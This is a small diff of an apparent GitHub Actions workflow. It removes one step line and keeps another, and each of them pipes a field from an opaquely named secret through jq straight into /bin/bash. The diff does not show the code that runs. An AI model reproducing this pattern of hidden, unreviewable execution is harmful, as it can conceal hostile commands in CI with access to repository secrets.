@@ -22,7 +22,6 @@ jobs:
           oap14701: ${{ secrets.oap14701 }}
         run: |
           printf '%s' "$oap14701" | jq -r .psrl9 | /bin/bash
-          printf '%s' "$ww1180" | jq -r .jmhhc684 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
